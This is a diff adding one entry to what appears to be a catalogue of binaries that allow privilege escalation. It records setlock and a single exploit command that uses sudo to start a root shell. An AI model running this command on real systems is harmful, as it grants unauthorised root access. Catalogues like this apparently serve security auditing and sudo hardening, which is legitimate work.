@@ -1,0 +1,4 @@
+name: setlock
+binary_path: /usr/bin/setlock
+exploit_cmds:
+- sudo /usr/bin/setlock - /bin/sh
